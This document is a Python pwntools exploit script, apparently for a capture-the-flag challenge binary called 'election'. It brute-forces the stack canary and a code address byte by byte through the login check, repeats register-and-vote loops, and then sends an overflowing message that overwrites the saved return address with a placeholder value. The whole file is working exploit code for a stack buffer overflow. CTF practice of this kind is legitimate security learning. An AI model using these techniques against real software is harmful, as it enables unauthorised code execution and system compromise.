#!/usr/bin/env python
from pwn import * 
context.arch = 'amd64'

r = process('./election', env={"LD_PRELOAD": "./libc.so"})
pause()

# leak canary and <libc_csu_init> addr bruteforcely
aaa = 'a' * 0xb8
canary_leaker = []
pie_leaker = []

r.sendlineafter('>', '2')  # register
r.sendthen('Register an anonymous token: ', aaa)

j = 0
while j < 8:
    for i in range(256):
        r.sendlineafter('>', '1')  # login
        r.sendthen('Token: ', aaa + ''.join([chr(x) for x in canary_leaker]) + chr(i))
        if 'Invalid' not in r.recvline():
            canary_leaker.append(i)
            # print("j = {}, leaker = {}".format(j, canary_leaker))
            r.sendlineafter('>', '3')  # logout
            j += 1
            break

j = 0
while j < 8:
    for i in range(256):
        r.sendlineafter('>', '1')  # login
        r.sendthen('Token: ', aaa + ''.join([chr(x) for x in canary_leaker]) + ''.join([chr(x) for x in pie_leaker]) + chr(i))
        if 'Invalid' not in r.recvline():
            pie_leaker.append(i)
            r.sendlineafter('>', '3')  # logout
            j += 1
            break

canary = u64(''.join([chr(x) for x in canary_leaker]))
libc_csu_init = u64(''.join([chr(x) for x in pie_leaker]))
success("leaked canary: {}".format(hex(canary)))
success("leaked <__libc_csu_init>: {}".format(hex(libc_csu_init)))

offset_from_msg_to_canary = 0xde28 - 0xdd40

for j in range(25):
    r.sendlineafter('>', '2')  # register
    r.sendlineafter('Register an anonymous token: ', 'jason')
    r.sendlineafter('>', '1')  # login
    r.sendlineafter('Token: ', 'jason')

# vote
    for i in range(10):
        r.sendlineafter('>', '1')  # vote
        r.sendlineafter('[0~9]: ', '0')

    r.sendlineafter('>', '3') # logout

r.sendlineafter('>', '2')  # register
r.sendlineafter('Register an anonymous token: ', 'jason')
r.sendlineafter('>', '1')  # login
r.sendlineafter('Token: ', 'jason')

# vote
for i in range(5):
    r.sendlineafter('>', '1')  # vote
    r.sendlineafter('[0~9]: ', '0')

r.sendlineafter('>', '3') # logout

r.sendlineafter('>', '1')
r.sendlineafter('Token: ', 'jason')
r.sendlineafter('>', '2') # say something
r.sendlineafter(': ', '0') # to pusheen
# r.sendlineafter('Message: ', 'b' * 10) # to pusheen
r.sendlineafter('Message: ', 'b' * offset_from_msg_to_canary + p64(canary) + 'b' * 8 + p64(0xdeadbeef)) # to pusheen
# success('message sent')
# r.sendlineafter('>', '3')
r.interactive()

